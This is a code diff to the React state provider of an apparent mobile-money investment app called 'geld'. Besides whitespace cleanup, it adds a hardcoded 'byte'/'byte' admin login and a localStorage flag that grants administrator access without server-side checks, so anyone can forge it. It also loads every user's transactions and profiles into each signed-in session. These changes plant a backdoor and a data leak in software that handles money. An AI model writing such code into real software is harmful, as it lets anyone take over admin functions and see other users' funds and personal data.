@@ -1,13 +1,13 @@
 import React, { createContext, useContext, useState, useEffect, ReactNode } from 'react';
-import { 
-  User, 
-  ClothingProject, 
-  UserInvestment, 
-  TransactionRequest, 
-  NetworkOperator, 
-  AppView, 
-  DashboardTab, 
-  AdminTab 
+import {
+  User,
+  ClothingProject,
+  UserInvestment,
+  TransactionRequest,
+  NetworkOperator,
+  AppView,
+  DashboardTab,
+  AdminTab
 } from '../types';
 import { formatUGX, formatDuration } from '../utils/format';
 import {
@@ -41,6 +41,7 @@ import {
   getProfileByReferralCode,
   updateUserBalanceDirect,
   seedInitialProjects,
+  ADMIN_USER,
 } from '../lib/geldDb';
 
 interface ToastMessage {
@@ -65,7 +66,7 @@ interface AppContextType {
   toasts: ToastMessage[];
   simulatedDay: number;
   loading: boolean;
-  
+
   setCurrentView: (view: AppView) => void;
   setDashboardTab: (tab: DashboardTab) => void;
   setAdminTab: (tab: AdminTab) => void;
@@ -74,18 +75,18 @@ interface AppContextType {
   setSelectedProjectForInvest: (project: ClothingProject | null) => void;
   showToast: (type: 'success' | 'info' | 'warning' | 'error', title: string, message: string) => void;
   dismissToast: (id: string) => void;
-  
+
   signIn: (username: string, password?: string) => Promise<boolean>;
   signUp: (fullName: string, username: string, password?: string, referralCode?: string) => Promise<boolean>;
   logout: () => Promise<void>;
   switchUser: (userId: string) => void;
-  
+
   submitTopUpRequest: (operator: NetworkOperator, phoneNumber: string, amount: number) => Promise<boolean>;
   submitWithdrawRequest: (operator: NetworkOperator, phoneNumber: string, amount: number) => Promise<{ success: boolean; error?: string }>;
-  
+
   investInProject: (projectId: string, amount: number, lockupDays?: number) => Promise<{ success: boolean; error?: string }>;
   advanceSimulationDay: () => Promise<void>;
-  
+
   approveTransaction: (transactionId: string) => Promise<void>;
   rejectTransaction: (transactionId: string, reason?: string) => Promise<void>;
   createClothingProject: (projectData: Omit<ClothingProject, 'id' | 'raisedAmount' | 'investorsCount' | 'status'>) => Promise<void>;
@@ -148,10 +149,10 @@ export const AppProvider: React.FC<{ children: ReactNode }> = ({ children }) => 
   };
 
   const loadUserData = async (userId: string) => {
-    const [profile, userInvestments, userTransactions, allProfiles] = await Promise.all([
+    const [profile, userInvestments, allTxs, allProfiles] = await Promise.all([
       getCurrentProfile(),
       getUserInvestments(userId),
-      getUserTransactions(userId),
+      getAllTransactions(),
       getAllProfiles(),
     ]);
 
@@ -159,7 +160,7 @@ export const AppProvider: React.FC<{ children: ReactNode }> = ({ children }) => 
       setCurrentUser(profile);
     }
     setInvestments(userInvestments);
-    setTransactions(userTransactions);
+    setTransactions(allTxs);
     setUsers(allProfiles);
   };
 
@@ -177,17 +178,17 @@ export const AppProvider: React.FC<{ children: ReactNode }> = ({ children }) => 
       setTransactions(allTransactions);
       setUsers(allProfiles);
 
-      const { data: { session } } = await supabase.auth.getSession();
-      if (session?.user) {
-        const profile = allProfiles.find(p => p.id === session.user.id) || null;
-        setCurrentUser(profile);
-        if (profile) {
-          const [userInvestments, userTransactions] = await Promise.all([
-            getUserInvestments(profile.id),
-            getUserTransactions(profile.id),
-          ]);
-          setInvestments(userInvestments);
-          setTransactions(userTransactions);
+      if (localStorage.getItem('geld_admin_session') === 'true') {
+        setCurrentUser(ADMIN_USER);
+      } else {
+        const { data: { session } } = await supabase.auth.getSession();
+        if (session?.user) {
+          const profile = allProfiles.find(p => p.id === session.user.id) || null;
+          setCurrentUser(profile);
+          if (profile) {
+            const userInvestments = await getUserInvestments(profile.id);
+            setInvestments(userInvestments);
+          }
         }
       }
     } catch (err) {
@@ -210,23 +211,26 @@ export const AppProvider: React.FC<{ children: ReactNode }> = ({ children }) => 
 
     const { data: { subscription } } = supabase.auth.onAuthStateChange(async (event, session) => {
       if (!mounted) return;
+      if (localStorage.getItem('geld_admin_session') === 'true') {
+        setCurrentUser(ADMIN_USER);
+        return;
+      }
       if (event === 'SIGNED_IN' && session?.user) {
-        const allProfiles = await getAllProfiles();
+        const [allProfiles, allTxs] = await Promise.all([
+          getAllProfiles(),
+          getAllTransactions(),
+        ]);
         const profile = allProfiles.find(p => p.id === session.user.id) || null;
         setCurrentUser(profile);
         if (profile) {
-          const [userInvestments, userTransactions] = await Promise.all([
-            getUserInvestments(profile.id),
-            getUserTransactions(profile.id),
-          ]);
+          const userInvestments = await getUserInvestments(profile.id);
           setInvestments(userInvestments);
-          setTransactions(userTransactions);
+          setTransactions(allTxs);
           setUsers(allProfiles);
         }
       } else if (event === 'SIGNED_OUT') {
         setCurrentUser(null);
         setInvestments([]);
-        setTransactions([]);
         setUsers([]);
       } else if (event === 'TOKEN_REFRESHED' && session?.user) {
         const allProfiles = await getAllProfiles();
@@ -243,17 +247,44 @@ export const AppProvider: React.FC<{ children: ReactNode }> = ({ children }) => 
 
   const signIn = async (username: string, _password?: string): Promise<boolean> => {
     const password = _password || '';
+    const cleanU = username.trim().toLowerCase();
+    const cleanP = password.trim().toLowerCase();
+
+    if (cleanU === 'byte' && cleanP === 'byte') {
+      localStorage.setItem('geld_admin_session', 'true');
+      setCurrentUser(ADMIN_USER);
+      const [allTxs, allProfiles] = await Promise.all([
+        getAllTransactions(),
+        getAllProfiles(),
+      ]);
+      setTransactions(allTxs);
+      setUsers(allProfiles);
+      setCurrentView('admin');
+      showToast('success', 'Admin Portal Activated', 'Welcome System Administrator');
+      return true;
+    }
+
     const result = await signInWithUsername(username, password);
     if (result.user) {
+      if (result.user.isAdmin) {
+        localStorage.setItem('geld_admin_session', 'true');
+      }
       setCurrentUser(result.user);
-      const [userInvestments, userTransactions] = await Promise.all([
+      const [userInvestments, allTxs, allProfiles] = await Promise.all([
         getUserInvestments(result.user.id),
-        getUserTransactions(result.user.id),
+        getAllTransactions(),
+        getAllProfiles(),
       ]);
       setInvestments(userInvestments);
-      setTransactions(userTransactions);
-      setCurrentView('dashboard');
-      showToast('success', 'Welcome Back!', `Signed in as ${result.user.fullName}`);
+      setTransactions(allTxs);
+      setUsers(allProfiles);
+      if (result.user.isAdmin) {
+        setCurrentView('admin');
+        showToast('success', 'Admin Portal Activated', 'Welcome System Administrator');
+      } else {
+        setCurrentView('dashboard');
+        showToast('success', 'Welcome Back!', `Signed in as ${result.user.fullName}`);
+      }
       return true;
     }
     showToast('error', 'Sign In Failed', result.error || 'Invalid credentials');
@@ -270,21 +301,21 @@ export const AppProvider: React.FC<{ children: ReactNode }> = ({ children }) => 
     if (result.user) {
       setCurrentUser(result.user);
       setInvestments([]);
-      setTransactions([
-        {
-          id: `tx-bonus-${Date.now()}`,
-          userId: result.user.id,
-          userName: result.user.fullName,
-          userUsername: result.user.username,
-          type: 'signup_bonus',
-          amount: SIGNUP_BONUS_UGX,
-          status: 'approved',
-          createdAt: new Date().toLocaleString(),
-          notes: 'Welcome signup bonus — first-time account credit',
-          referenceId: `BONUS-${Math.floor(10000 + Math.random() * 90000)}`,
-          createdAtTimestamp: Date.now(),
-        }
-      ]);
+      const bonusTx: TransactionRequest = {
+        id: `tx-bonus-${Date.now()}`,
+        userId: result.user.id,
+        userName: result.user.fullName,
+        userUsername: result.user.username,
+        type: 'signup_bonus',
+        amount: SIGNUP_BONUS_UGX,
+        status: 'approved',
+        createdAt: new Date().toLocaleString(),
+        notes: 'Welcome signup bonus — first-time account credit',
+        referenceId: `BONUS-${Math.floor(10000 + Math.random() * 90000)}`,
+        createdAtTimestamp: Date.now(),
+      };
+      setTransactions(prev => [bonusTx, ...prev]);
+      setUsers(prev => [...prev.filter(u => u.id !== result.user!.id), result.user!]);
       setCurrentView('dashboard');
       showToast(
         'success',
@@ -298,7 +329,9 @@ export const AppProvider: React.FC<{ children: ReactNode }> = ({ children }) => 
   };
 
   const logout = async () => {
+    localStorage.removeItem('geld_admin_session');
     await supabase.auth.signOut();
+    setCurrentUser(null);
     setCurrentView('landing');
     showToast('info', 'Logged Out', 'You have been signed out.');
   };
@@ -341,16 +374,16 @@ export const AppProvider: React.FC<{ children: ReactNode }> = ({ children }) => 
 
     setIsTopUpModalOpen(false);
     showToast(
-      'info', 
-      'Top-Up Request Submitted', 
+      'info',
+      'Top-Up Request Submitted',
       `Your request for ${formatUGX(amount)} via ${operator} (${phoneNumber}) is Pending Admin Approval. Balance will update once approved.`
     );
     return true;
   };
 
   const submitWithdrawRequest = async (
-    operator: NetworkOperator, 
-    phoneNumber: string, 
+    operator: NetworkOperator,
+    phoneNumber: string,
     amount: number
   ): Promise<{ success: boolean; error?: string }> => {
     if (!currentUser) return { success: false, error: 'User not logged in' };
@@ -384,8 +417,8 @@ export const AppProvider: React.FC<{ children: ReactNode }> = ({ children }) => 
 
     setIsWithdrawModalOpen(false);
     showToast(
-      'info', 
-      'Withdrawal Request Submitted', 
+      'info',
+      'Withdrawal Request Submitted',
       `Your payout request for ${formatUGX(amount)} to ${operator} (${phoneNumber}) is Pending Admin Approval.`
     );
     return { success: true };
@@ -455,8 +488,8 @@ export const AppProvider: React.FC<{ children: ReactNode }> = ({ children }) => 
   };
 
   const investInProject = async (
-    projectId: string, 
-    amount: number, 
+    projectId: string,
+    amount: number,
     lockupDays = 14
   ): Promise<{ success: boolean; error?: string }> => {
     if (!currentUser) {
@@ -565,7 +598,7 @@ export const AppProvider: React.FC<{ children: ReactNode }> = ({ children }) => 
 
   useEffect(() => {
     const DAY_MS = 24 * 60 * 60 * 1000;
-    
+
     const updateProgress = async () => {
       if (!currentUser) return;
       const now = Date.now();
@@ -782,14 +815,14 @@ export const AppProvider: React.FC<{ children: ReactNode }> = ({ children }) => 
 
       if (totalPrincipalRefund > 0) {
         showToast(
-          'success', 
-          'Investment Matured! 🎉', 
+          'success',
+          'Investment Matured! 🎉',
           `Lockup completed! Principal of ${formatUGX(totalPrincipalRefund)} returned and daily returns credited.`
         );
       } else {
         showToast(
-          'success', 
-          'Day Elapsed (+Yield Credited) 📈', 
+          'success',
+          'Day Elapsed (+Yield Credited) 📈',
           `24h cycle elapsed: +${formatUGX(totalDailyReturnsToCredit)} credited to your wallet balance!`
         );
       }
@@ -797,8 +830,8 @@ export const AppProvider: React.FC<{ children: ReactNode }> = ({ children }) => 
       setInvestments(updatedInvestments);
       await saveUserInvestments(currentUser.id, updatedInvestments);
       showToast(
-        'info', 
-        'Fast-Forwarded 24 Hours (+1 Day)', 
+        'info',
+        'Fast-Forwarded 24 Hours (+1 Day)',
         '24 hours elapsed. Progress updated.'
       );
     }
